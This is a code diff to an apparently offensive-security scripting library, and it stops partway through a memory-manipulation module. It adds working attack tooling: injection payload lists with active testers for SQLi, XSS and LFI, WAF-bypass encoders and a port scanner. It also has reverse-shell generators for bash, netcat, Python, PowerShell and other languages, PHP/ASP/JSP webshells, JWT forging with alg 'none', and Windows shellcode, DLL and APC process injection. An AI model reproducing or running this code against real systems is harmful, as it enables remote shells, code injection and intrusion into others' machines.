@@ -15,9 +15,20 @@ def _rv(value, vtype="any"):
     return RuntimeValue(value, vtype)
 
 def _v(x):
-    """Unwrap RuntimeValue → raw Python value."""
+    """Unwrap RuntimeValue → raw Python value (one level)."""
     from interpreter import RuntimeValue
     return x.value if isinstance(x, RuntimeValue) else x
+
+def _deep_v(x):
+    """Recursively unwrap RuntimeValue → plain Python value."""
+    from interpreter import RuntimeValue
+    if isinstance(x, RuntimeValue):
+        x = x.value
+    if isinstance(x, dict):
+        return {k: _deep_v(v) for k, v in x.items()}
+    if isinstance(x, list):
+        return [_deep_v(i) for i in x]
+    return x
 
 def _arr(items, vtype="any"):
     return _rv([_rv(i, vtype) if not hasattr(i, 'value') else i for i in items], "array")
@@ -812,9 +823,9 @@ def _jwt_crack(token, wordlist):
     return _rv({"cracked": False}, "dict")
 
 def _jwt_forge(payload, secret=""):
-    header = {"alg": "HS256" if secret else "none", "typ": "JWT"}
+    header = {"alg": "HS256" if _v(secret) else "none", "typ": "JWT"}
     h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
-    p = base64.urlsafe_b64encode(json.dumps(_v(payload) if isinstance(_v(payload), dict) else payload).encode()).rstrip(b'=').decode()
+    p = base64.urlsafe_b64encode(json.dumps(_deep_v(payload)).encode()).rstrip(b'=').decode()
     if secret:
         sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
         s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
@@ -1308,6 +1319,1411 @@ def _ftp_anon(host, port=21):
 # MODULE REGISTRY
 # ═══════════════════════════════════════════════════════════════════════
 
+# ═══════════════════════════════════════════════════════════════════════
+# CYBERSECURITY MODULES
+# ═══════════════════════════════════════════════════════════════════════
+
+def vuln_module() -> Dict[str, Callable]:
+    """Vulnerability detection: SQLi/XSS/LFI/SSRF/CMDi/SSTI payloads and active testing"""
+    import urllib.request, urllib.parse
+
+    SQLI = ["' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "1' ORDER BY 1--",
+            "1' ORDER BY 2--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
+            "' AND SLEEP(5)--", "1; SELECT SLEEP(5)--", "' AND 1=1--", "' AND 1=2--",
+            "'; DROP TABLE users--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            "' OR SLEEP(5)--", "admin'--", "' OR ''='"]
+    XSS  = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>", "javascript:alert(1)",
+            '"><script>alert(1)</script>', "'><script>alert(1)</script>",
+            "<ScRiPt>alert(1)</ScRiPt>", "<iframe src=javascript:alert(1)>",
+            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
+            "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">"]
+    LFI  = ["../../../etc/passwd", "../../../../etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd",
+            "/etc/passwd", "/etc/shadow", "/proc/self/environ",
+            "C:\\Windows\\System32\\drivers\\etc\\hosts",
+            "php://filter/convert.base64-encode/resource=index.php",
+            "php://input", "data://text/plain,<?php system($_GET['cmd']); ?>"]
+    SSTI = ["{{7*7}}", "{{7*'7'}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
+            "{{config}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"]
+    CMDI = ["; id", "| id", "& id", "&& id", "; cat /etc/passwd",
+            "`id`", "$(id)", "\nid", "; whoami", "1; ls -la", "1 | ls"]
+    SSRF = ["http://127.0.0.1/", "http://localhost/",
+            "http://169.254.169.254/latest/meta-data/",
+            "http://metadata.google.internal/computeMetadata/v1/",
+            "http://0.0.0.0/", "file:///etc/passwd",
+            "dict://127.0.0.1:6379/", "gopher://127.0.0.1:6379/",
+            "http://2130706433/"]  # 127.0.0.1 decimal
+
+    SQLI_ERRORS = ["you have an error in your sql", "syntax error", "unclosed quotation",
+                   "mysql_fetch", "ORA-", "pg_query()", "sqlite_", "warning: mysql",
+                   "division by zero", "supplied argument is not a valid mysql"]
+
+    def _test_sqli(url, param, method="GET"):
+        results = []
+        for payload in SQLI[:6]:
+            try:
+                u = f"{_v(url)}?{_v(param)}={urllib.parse.quote(payload)}"
+                with urllib.request.urlopen(urllib.request.Request(u), timeout=5) as r:
+                    body = r.read().decode('utf-8', errors='ignore').lower()
+                    for err in SQLI_ERRORS:
+                        if err in body:
+                            results.append(_rv({"payload": payload, "error": err, "url": u}, "dict"))
+                            break
+            except Exception: pass
+        return _rv(results, "array")
+
+    def _test_xss(url, param):
+        results = []
+        for payload in XSS[:5]:
+            try:
+                u = f"{_v(url)}?{_v(param)}={urllib.parse.quote(payload)}"
+                with urllib.request.urlopen(urllib.request.Request(u), timeout=5) as r:
+                    body = r.read().decode('utf-8', errors='ignore')
+                    if payload in body:
+                        results.append(_rv({"payload": payload, "type": "reflected", "url": u}, "dict"))
+            except Exception: pass
+        return _rv(results, "array")
+
+    def _test_lfi(url, param):
+        results = []
+        indicators = ["root:x:", "[boot loader]", "daemon:", "windows nt"]
+        for payload in LFI[:5]:
+            try:
+                u = f"{_v(url)}?{_v(param)}={urllib.parse.quote(payload)}"
+                with urllib.request.urlopen(urllib.request.Request(u), timeout=5) as r:
+                    body = r.read().decode('utf-8', errors='ignore').lower()
+                    for ind in indicators:
+                        if ind in body:
+                            results.append(_rv({"payload": payload, "indicator": ind, "url": u}, "dict"))
+                            break
+            except Exception: pass
+        return _rv(results, "array")
+
+    def _scan_headers(url):
+        REQUIRED = {
+            "x-frame-options": "Clickjacking protection",
+            "x-xss-protection": "XSS filter",
+            "x-content-type-options": "MIME sniffing protection",
+            "strict-transport-security": "HSTS",
+            "content-security-policy": "CSP",
+            "referrer-policy": "Referrer policy",
+        }
+        try:
+            with urllib.request.urlopen(urllib.request.Request(_v(url)), timeout=10) as r:
+                hdrs = {k.lower(): v for k, v in dict(r.headers).items()}
+                missing = [_rv({"header": h, "desc": d}, "dict") for h, d in REQUIRED.items() if h not in hdrs]
+                present = [_rv({"header": h, "value": hdrs[h]}, "dict") for h in REQUIRED if h in hdrs]
+                return _rv({"missing": missing, "present": present, "score": len(present)}, "dict")
+        except Exception as e:
+            return _rv({"error": str(e), "missing": [], "present": []}, "dict")
+
+    return {
+        "sqli_payloads":  lambda: _arr([_rv(p, "string") for p in SQLI]),
+        "xss_payloads":   lambda: _arr([_rv(p, "string") for p in XSS]),
+        "lfi_payloads":   lambda: _arr([_rv(p, "string") for p in LFI]),
+        "ssti_payloads":  lambda: _arr([_rv(p, "string") for p in SSTI]),
+        "cmdi_payloads":  lambda: _arr([_rv(p, "string") for p in CMDI]),
+        "ssrf_payloads":  lambda: _arr([_rv(p, "string") for p in SSRF]),
+        "test_sqli":      _test_sqli,
+        "test_xss":       _test_xss,
+        "test_lfi":       _test_lfi,
+        "scan_headers":   _scan_headers,
+        "severity":       lambda score: _rv(
+            "Critical" if _v(score) >= 9 else "High" if _v(score) >= 7
+            else "Medium" if _v(score) >= 4 else "Low" if _v(score) >= 0.1 else "Info", "string"),
+    }
+
+
+def session_module() -> Dict[str, Callable]:
+    """HTTP session management with persistent cookies, redirects and auth"""
+    import urllib.request, urllib.parse, urllib.error, http.cookiejar
+
+    class HTTPSession:
+        def __init__(self):
+            self.cookies = http.cookiejar.CookieJar()
+            self.headers  = {"User-Agent": "KOPPA/3.0 Security Scanner"}
+            self.opener   = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookies))
+
+        def set_header(self, k, v):   self.headers[_v(k)] = _v(v)
+        def get_cookies(self):         return {c.name: c.value for c in self.cookies}
+
+        def get(self, url, timeout=10):
+            try:
+                req = urllib.request.Request(_v(url), headers=self.headers)
+                with self.opener.open(req, timeout=int(_v(timeout))) as r:
+                    return _rv({"status": r.status, "body": r.read().decode("utf-8", errors="ignore"),
+                                "headers": dict(r.headers), "cookies": self.get_cookies()}, "dict")
+            except urllib.error.HTTPError as e:
+                return _rv({"status": e.code, "body": e.read().decode("utf-8", errors="ignore"),
+                            "error": str(e)}, "dict")
+            except Exception as e:
+                return _rv({"status": 0, "error": str(e)}, "dict")
+
+        def post(self, url, data=None, json_body=None, timeout=10):
+            try:
+                hdrs = dict(self.headers)
+                if json_body:
+                    body = json.dumps({k: _v(v) for k, v in _v(json_body).items()}).encode()
+                    hdrs["Content-Type"] = "application/json"
+                elif data:
+                    d = {k: str(_v(v)) for k, v in _v(data).items()}
+                    body = urllib.parse.urlencode(d).encode()
+                    hdrs["Content-Type"] = "application/x-www-form-urlencoded"
+                else:
+                    body = b""
+                req = urllib.request.Request(_v(url), data=body, headers=hdrs, method="POST")
+                with self.opener.open(req, timeout=int(_v(timeout))) as r:
+                    return _rv({"status": r.status, "body": r.read().decode("utf-8", errors="ignore"),
+                                "cookies": self.get_cookies()}, "dict")
+            except urllib.error.HTTPError as e:
+                return _rv({"status": e.code, "body": e.read().decode("utf-8", errors="ignore"),
+                            "error": str(e)}, "dict")
+            except Exception as e:
+                return _rv({"status": 0, "error": str(e)}, "dict")
+
+        def set_proxy(self, proxy_url):
+            p = urllib.request.ProxyHandler({"http": _v(proxy_url), "https": _v(proxy_url)})
+            self.opener = urllib.request.build_opener(p, urllib.request.HTTPCookieProcessor(self.cookies))
+
+    def _new_session():
+        sess = HTTPSession()
+        return _rv(sess, "session")
+
+    return {"new": _new_session, "Session": _new_session}
+
+
+def payload_module() -> Dict[str, Callable]:
+    """Reverse shells, webshells, payload encoding, MSF cyclic patterns"""
+    import base64, urllib.parse
+
+    SHELLS = {
+        "bash":   lambda h, p: f"bash -i >& /dev/tcp/{h}/{p} 0>&1",
+        "bash2":  lambda h, p: f"0<&196;exec 196<>/dev/tcp/{h}/{p}; sh <&196 >&196 2>&196",
+        "python": lambda h, p: f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "php":    lambda h, p: f"php -r '$sock=fsockopen(\"{h}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "nc":     lambda h, p: f"nc -e /bin/sh {h} {p}",
+        "nc2":    lambda h, p: f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {h} {p} >/tmp/f",
+        "perl":   lambda h, p: f"perl -e 'use Socket;$i=\"{h}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+        "ruby":   lambda h, p: f"ruby -rsocket -e 'f=TCPSocket.open(\"{h}\",{p}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "powershell": lambda h, p: f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{h}',{p});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb=$sb+'PS '+(pwd).Path+'> ';$rb=([text.encoding]::ASCII).GetBytes($sb);$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()\"",
+        "go":     lambda h, p: f'package main;import("net";"os/exec");func main(){{c,_:=net.Dial("tcp","{h}:{p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
+    }
+    WEBSHELLS = {
+        "php":    "<?php system($_GET['cmd']); ?>",
+        "php2":   "<?php passthru($_GET['cmd']); ?>",
+        "php3":   "<?php echo shell_exec($_GET['cmd']); ?>",
+        "php4":   "<?php @eval($_POST['cmd']); ?>",
+        "asp":    '<%@ Language=VBScript %>\n<% Response.Write CreateObject("Wscript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall() %>',
+        "jsp":    '<% Runtime rt=Runtime.getRuntime();String[] c={"/bin/bash","-c",request.getParameter("cmd")};Process p=rt.exec(c);out.println(new java.util.Scanner(p.getInputStream()).useDelimiter("\\A").next()); %>',
+    }
+
+    def _reverse_shell(lang, lhost, lport):
+        fn = SHELLS.get(_v(lang).lower())
+        if fn: return _rv(fn(_v(lhost), str(_v(lport))), "string")
+        return _rv("# unsupported language", "string")
+
+    def _encode(payload, method):
+        p, m = _v(payload), _v(method).lower()
+        if m == "base64":  return _rv(base64.b64encode(p.encode()).decode(), "string")
+        if m == "url":     return _rv(urllib.parse.quote(p), "string")
+        if m == "url2":    return _rv(urllib.parse.quote(urllib.parse.quote(p)), "string")
+        if m == "hex":     return _rv(p.encode().hex(), "string")
+        if m == "unicode": return _rv("".join(f"\\u{ord(c):04x}" for c in p), "string")
+        if m == "html":    return _rv("".join(f"&#{ord(c)};" for c in p), "string")
+        return _rv(p, "string")
+
+    def _msf_pattern(length):
+        upper, lower, digits = "ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz", "0123456789"
+        pat = ""
+        for u in upper:
+            for l in lower:
+                for d in digits:
+                    pat += u + l + d
+                    if len(pat) >= int(_v(length)):
+                        return _rv(pat[:int(_v(length))], "string")
+        return _rv(pat[:int(_v(length))], "string")
+
+    def _xor_encode(data, key):
+        d = _v(data)
+        k = _v(key)
+        if isinstance(d, str): d = d.encode()
+        if isinstance(k, int): result = bytes(b ^ k for b in d)
+        elif isinstance(k, str):
+            kb = k.encode()
+            result = bytes(d[i] ^ kb[i % len(kb)] for i in range(len(d)))
+        else: result = d
+        return _rv(result.hex(), "string")
+
+    def _sql_union(cols):
+        return _rv("' UNION SELECT " + ",".join(["NULL"] * int(_v(cols))) + "--", "string")
+
+    return {
+        "reverse_shell":  _reverse_shell,
+        "webshell":       lambda lang: _rv(WEBSHELLS.get(_v(lang).lower(), "# unknown"), "string"),
+        "encode":         _encode,
+        "xor_encode":     _xor_encode,
+        "msf_pattern":    _msf_pattern,
+        "shells":         lambda: _arr([_rv(k, "string") for k in SHELLS.keys()]),
+        "listener":       lambda h, p: _rv(f"nc -lvnp {_v(p)}", "string"),
+        "listener_ssl":   lambda h, p: _rv(f"ncat --ssl -lvnp {_v(p)}", "string"),
+        "sql_union":      _sql_union,
+        "sql_sleep":      lambda s: _rv(f"'; SELECT SLEEP({_v(s)})--", "string"),
+    }
+
+
+def bypass_module() -> Dict[str, Callable]:
+    """WAF bypass techniques, IP obfuscation, encoding chains"""
+    import urllib.parse, base64
+
+    def _xss_variants(payload):
+        p = _v(payload)
+        return _arr([_rv(v, "string") for v in [
+            p,
+            p.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"),
+            p.replace(" ", "\t"),
+            p.replace("alert", "confirm"),
+            p.replace("alert", "prompt"),
+            p.replace("<", "%3C").replace(">", "%3E"),
+            "<!--" + p + "-->",
+            p.replace("alert(1)", "alert(1)//"),
+        ]])
+
+    def _sqli_variants(payload):
+        p = _v(payload)
+        return _arr([_rv(v, "string") for v in [
+            p, p.upper(), p.lower(),
+            p.replace(" ", "/**/"),
+            p.replace(" ", "%20"),
+            p.replace(" ", "+"),
+            p.replace("SELECT", "SEL/**/ECT"),
+            p.replace("UNION", "UN/**/ION"),
+            p.replace("=", " LIKE "),
+            urllib.parse.quote(p),
+        ]])
+
+    def _ip_variants(ip):
+        parts = _v(ip).split(".")
+        if len(parts) != 4: return _arr([_rv(_v(ip), "string")])
+        a, b, c, d = (int(x) for x in parts)
+        dec = (a << 24) | (b << 16) | (c << 8) | d
+        return _arr([_rv(v, "string") for v in [
+            _v(ip),
+            str(dec),
+            f"0x{dec:08x}",
+            ".".join(f"0{oct(int(x))[2:]}" for x in parts),
+            ".".join(f"0x{int(x):02x}" for x in parts),
+            f"[::ffff:{a}.{b}.{c}.{d}]",
+            f"0x7f.0.0.1" if _v(ip) == "127.0.0.1" else _v(ip),
+        ]])
+
+    def _encode_chain(payload, *methods):
+        p = _v(payload)
+        for m in methods:
+            mv = _v(m).lower()
+            if mv == "base64":  p = base64.b64encode(p.encode()).decode()
+            elif mv == "url":   p = urllib.parse.quote(p)
+            elif mv == "html":  p = "".join(f"&#{ord(c)};" for c in p)
+            elif mv == "hex":   p = p.encode().hex()
+        return _rv(p, "string")
+
+    USER_AGENTS = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
+        "Googlebot/2.1 (+http://www.google.com/bot.html)",
+        "sqlmap/1.7.12#stable (https://sqlmap.org)",
+        "Nikto/2.1.6",
+        "curl/7.68.0",
+        "python-requests/2.31.0",
+    ]
+
+    return {
+        "xss_variants":   _xss_variants,
+        "sqli_variants":  _sqli_variants,
+        "ip_variants":    _ip_variants,
+        "encode_chain":   _encode_chain,
+        "user_agents":    lambda: _arr([_rv(ua, "string") for ua in USER_AGENTS]),
+        "random_ua":      lambda: _rv(USER_AGENTS[int(__import__('time').time()) % len(USER_AGENTS)], "string"),
+        "null_byte":      lambda p: _rv(_v(p) + "%00", "string"),
+        "double_encode":  lambda p: _rv(urllib.parse.quote(urllib.parse.quote(_v(p))), "string"),
+        "case_toggle":    lambda p: _rv("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(_v(p))), "string"),
+    }
+
+
+def adv_scan_module() -> Dict[str, Callable]:
+    """Advanced port scanning: parallel, UDP, banner grabbing, service detection"""
+    import socket, concurrent.futures
+
+    SERVICES = {
+        21:"ftp", 22:"ssh", 23:"telnet", 25:"smtp", 53:"dns",
+        80:"http", 110:"pop3", 111:"rpcbind", 135:"msrpc", 139:"netbios",
+        143:"imap", 161:"snmp", 389:"ldap", 443:"https", 445:"smb",
+        512:"rexec", 513:"rlogin", 514:"rsh", 587:"smtp",
+        631:"ipp", 993:"imaps", 995:"pop3s", 1080:"socks5",
+        1433:"mssql", 1521:"oracle", 2049:"nfs", 2375:"docker",
+        3306:"mysql", 3389:"rdp", 4444:"metasploit", 5432:"postgresql",
+        5900:"vnc", 6379:"redis", 6443:"kubernetes", 8080:"http-alt",
+        8443:"https-alt", 8888:"jupyter", 9200:"elasticsearch",
+        27017:"mongodb", 50000:"db2",
+    }
+
+    def _tcp(host, port, timeout=1.0):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(float(_v(timeout)))
+            ok = s.connect_ex((_v(host), int(_v(port)))) == 0
+            s.close()
+            return _rv(ok, "bool")
+        except Exception:
+            return _rv(False, "bool")
+
+    def _udp(host, port, timeout=2.0):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(float(_v(timeout)))
+            s.sendto(b"\x00", (_v(host), int(_v(port))))
+            try:
+                s.recvfrom(64)
+                s.close()
+                return _rv(True, "bool")
+            except socket.timeout:
+                s.close()
+                return _rv(True, "bool")
+        except Exception:
+            return _rv(False, "bool")
+
+    def _banner(host, port, timeout=3.0):
+        try:
+            h, p, t = _v(host), int(_v(port)), float(_v(timeout))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(t)
+            s.connect((h, p))
+            if p in (80, 8080, 8000):
+                s.send(f"HEAD / HTTP/1.0\r\nHost: {h}\r\n\r\n".encode())
+            elif p == 21:
+                pass  # FTP sends banner automatically
+            banner = s.recv(1024).decode("utf-8", errors="replace").strip()
+            s.close()
+            return _rv(banner, "string")
+        except Exception:
+            return _rv("", "string")
+
+    def _parallel(host, ports, timeout=1.0, threads=100):
+        h, t = _v(host), float(_v(timeout))
+        plist = [int(_v(p)) for p in _v(ports)]
+        open_ports = []
+        def _scan(port):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(t)
+            try:
+                ok = s.connect_ex((h, port)) == 0
+            except Exception:
+                ok = False
+            finally:
+                s.close()
+            return port, ok
+        with concurrent.futures.ThreadPoolExecutor(max_workers=min(int(_v(threads)), 250)) as ex:
+            for port, ok in ex.map(_scan, plist):
+                if ok:
+                    open_ports.append(_rv(port, "int"))
+        open_ports.sort(key=lambda x: _v(x))
+        return _rv(open_ports, "array")
+
+    def _port_range(start, end):
+        return _rv([_rv(p, "int") for p in range(int(_v(start)), int(_v(end)) + 1)], "array")
+
+    TOP_PORTS = sorted(SERVICES.keys())
+
+    return {
+        "tcp":          _tcp,
+        "udp":          _udp,
+        "banner":       _banner,
+        "parallel":     _parallel,
+        "mass":         _parallel,
+        "port_range":   _port_range,
+        "service":      lambda p: _rv(SERVICES.get(int(_v(p)), "unknown"), "string"),
+        "top_ports":    lambda n=20: _rv([_rv(p, "int") for p in TOP_PORTS[:int(_v(n))]], "array"),
+        "common_ports": lambda: _rv([_rv(p, "int") for p in TOP_PORTS[:20]], "array"),
+        "is_open":      _tcp,
+    }
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# PROCESS INJECTION  (Windows API via ctypes)
+# ═══════════════════════════════════════════════════════════════════════
+
+def inject_module() -> Dict[str, Callable]:
+    import platform
+    import ctypes
+    _is_win = platform.system() == "Windows"
+
+    PROCESS_ALL_ACCESS     = 0x1F0FFF
+    MEM_COMMIT             = 0x1000
+    MEM_RESERVE            = 0x2000
+    MEM_RELEASE            = 0x8000
+    PAGE_EXECUTE_READWRITE = 0x40
+    PAGE_READWRITE         = 0x04
+    TH32CS_SNAPPROCESS     = 0x00000002
+    TH32CS_SNAPTHREAD      = 0x00000004
+
+    def _k32():
+        if not _is_win:
+            raise RuntimeError("inject module requires Windows")
+        return ctypes.windll.kernel32
+
+    def _list_procs():
+        if not _is_win:
+            return _rv([_rv({"pid": 0, "name": "windows-only"}, "dict")], "array")
+        k32 = _k32()
+
+        class PROCESSENTRY32(ctypes.Structure):
+            _fields_ = [
+                ("dwSize",              ctypes.c_ulong),
+                ("cntUsage",            ctypes.c_ulong),
+                ("th32ProcessID",       ctypes.c_ulong),
+                ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
+                ("th32ModuleID",        ctypes.c_ulong),
+                ("cntThreads",          ctypes.c_ulong),
+                ("th32ParentProcessID", ctypes.c_ulong),
+                ("pcPriClassBase",      ctypes.c_long),
+                ("dwFlags",             ctypes.c_ulong),
+                ("szExeFile",           ctypes.c_char * 260),
+            ]
+
+        snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        pe = PROCESSENTRY32()
+        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
+        procs = []
+        if k32.Process32First(snap, ctypes.byref(pe)):
+            while True:
+                procs.append(_rv({
+                    "pid":        pe.th32ProcessID,
+                    "name":       pe.szExeFile.decode("utf-8", errors="replace"),
+                    "parent_pid": pe.th32ParentProcessID,
+                    "threads":    pe.cntThreads,
+                }, "dict"))
+                if not k32.Process32Next(snap, ctypes.byref(pe)):
+                    break
+        k32.CloseHandle(snap)
+        return _rv(procs, "array")
+
+    def _find_pid(name):
+        name = _v(name)
+        if not _is_win:
+            return _rv(-1, "int")
+        for p in _list_procs().value:
+            proc = p.value if isinstance(p, type(p)) else p
+            n = proc.get("name") if isinstance(proc, dict) else None
+            if n is None:
+                continue
+            n = n.value if hasattr(n, "value") else n
+            if isinstance(n, str) and n.lower() == name.lower():
+                pid = proc.get("pid")
+                return pid if hasattr(pid, "value") else _rv(pid, "int")
+        return _rv(-1, "int")
+
+    def _bytes_from_val(val):
+        if hasattr(val, "data"):
+            return val.data
+        if isinstance(val, (bytes, bytearray)):
+            return bytes(val)
+        if isinstance(val, str):
+            return bytes.fromhex(val.replace(" ", "").replace("\\x", ""))
+        return b""
+
+    def _shellcode_inject(pid, shellcode):
+        pid = _v(pid)
+        sc  = _bytes_from_val(_v(shellcode))
+        if not _is_win:
+            return _rv({"ok": False, "error": "Windows only"}, "dict")
+        k32 = _k32()
+        h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if not h:
+            return _rv({"ok": False, "error": f"OpenProcess failed (err={ctypes.GetLastError()})"}, "dict")
+        try:
+            addr = k32.VirtualAllocEx(h, None, len(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+            if not addr:
+                return _rv({"ok": False, "error": "VirtualAllocEx failed"}, "dict")
+            buf = (ctypes.c_char * len(sc))(*sc)
+            written = ctypes.c_size_t(0)
+            if not k32.WriteProcessMemory(h, addr, buf, len(sc), ctypes.byref(written)):
+                k32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)
+                return _rv({"ok": False, "error": "WriteProcessMemory failed"}, "dict")
+            tid = ctypes.c_ulong(0)
+            hthread = k32.CreateRemoteThread(h, None, 0, addr, None, 0, ctypes.byref(tid))
+            if not hthread:
+                k32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)
+                return _rv({"ok": False, "error": "CreateRemoteThread failed"}, "dict")
+            k32.CloseHandle(hthread)
+            return _rv({"ok": True, "pid": pid, "addr": addr, "tid": tid.value}, "dict")
+        finally:
+            k32.CloseHandle(h)
+
+    def _dll_inject(pid, dll_path):
+        pid      = _v(pid)
+        dll_path = _v(dll_path)
+        if not _is_win:
+            return _rv({"ok": False, "error": "Windows only"}, "dict")
+        k32 = _k32()
+        dll_bytes = (dll_path + "\0").encode("utf-8")
+        h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if not h:
+            return _rv({"ok": False, "error": "OpenProcess failed"}, "dict")
+        try:
+            addr = k32.VirtualAllocEx(h, None, len(dll_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+            if not addr:
+                return _rv({"ok": False, "error": "VirtualAllocEx failed"}, "dict")
+            buf = (ctypes.c_char * len(dll_bytes))(*dll_bytes)
+            written = ctypes.c_size_t(0)
+            k32.WriteProcessMemory(h, addr, buf, len(dll_bytes), ctypes.byref(written))
+            hmod    = k32.GetModuleHandleW("kernel32.dll")
+            loadlib = k32.GetProcAddress(hmod, b"LoadLibraryA")
+            tid = ctypes.c_ulong(0)
+            hthread = k32.CreateRemoteThread(h, None, 0, loadlib, addr, 0, ctypes.byref(tid))
+            if not hthread:
+                k32.VirtualFreeEx(h, addr, 0, MEM_RELEASE)
+                return _rv({"ok": False, "error": "CreateRemoteThread failed"}, "dict")
+            k32.WaitForSingleObject(hthread, 5000)
+            k32.CloseHandle(hthread)
+            return _rv({"ok": True, "pid": pid, "dll": dll_path}, "dict")
+        finally:
+            k32.CloseHandle(h)
+
+    def _apc_inject(pid, shellcode):
+        pid = _v(pid)
+        sc  = _bytes_from_val(_v(shellcode))
+        if not _is_win:
+            return _rv({"ok": False, "error": "Windows only"}, "dict")
+        k32 = _k32()
+
+        class THREADENTRY32(ctypes.Structure):
+            _fields_ = [
+                ("dwSize",             ctypes.c_ulong),
+                ("cntUsage",           ctypes.c_ulong),
+                ("th32ThreadID",       ctypes.c_ulong),
+                ("th32OwnerProcessID", ctypes.c_ulong),
+                ("tpBasePri",          ctypes.c_long),
+                ("tpDeltaPri",         ctypes.c_long),
+                ("dwFlags",            ctypes.c_ulong),
+            ]
+
+        h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if not h:
+            return _rv({"ok": False, "error": "OpenProcess failed"}, "dict")
+        try:
+            addr = k32.VirtualAllocEx(h, None, len(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+            buf  = (ctypes.c_char * len(sc))(*sc)
+            written = ctypes.c_size_t(0)
+            k32.WriteProcessMemory(h, addr, buf, len(sc), ctypes.byref(written))
+
+            snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
+            te = THREADENTRY32()
+            te.dwSize = ctypes.sizeof(THREADENTRY32)
+            THREAD_ACCESS = 0x0010 | 0x0002 | 0x0040
+            queued = 0
+            if k32.Thread32First(snap, ctypes.byref(te)):
+                while True:
+                    if te.th32OwnerProcessID == pid:
+                        ht = k32.OpenThread(THREAD_ACCESS, False, te.th32ThreadID)
+                        if ht:
+                            k32.QueueUserAPC(addr, ht, None)
+                            k32.CloseHandle(ht)
+                            queued += 1
+                    if not k32.Thread32Next(snap, ctypes.byref(te)):
+                        break
+            k32.CloseHandle(snap)
+            return _rv({"ok": True, "pid": pid, "addr": addr, "threads_queued": queued}, "dict")
+        finally:
+            k32.CloseHandle(h)
+
+    return {
+        "list_procs": lambda: _list_procs(),
+        "find_pid":   lambda name: _find_pid(name),
+        "shellcode":  lambda pid, sc: _shellcode_inject(pid, sc),
+        "dll":        lambda pid, path: _dll_inject(pid, path),
+        "apc":        lambda pid, sc: _apc_inject(pid, sc),
+        "is_windows": lambda: _rv(_is_win, "bool"),
+    }
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MEMORY MANIPULATION  (Windows API via ctypes)
+# ═══════════════════════════════════════════════════════════════════════
+
+def mem_module() -> Dict[str, Callable]:
+    import platform
+    import ctypes
+    _is_win = platform.system() == "Windows"
+
+    PROCESS_ALL_ACCESS     = 0x1F0FFF
+    MEM_COMMIT             = 0x1000
+    MEM_RESERVE            = 0x2000
+    MEM_RELEASE            = 0x8000
+    PAGE_EXECUTE_READWRITE = 0x40
+    PAGE_READWRITE         = 0x04
+    PAGE_READONLY          = 0x02
+    PAGE_NOACCESS          = 0x01
+    MEM_COMMIT_STATE       = 0x1000
+
+    def _k32():
+        if not _is_win:
+            raise RuntimeError("mem module requires Windows")
+        return ctypes.windll.kernel32
+
+    def _open_proc(pid):
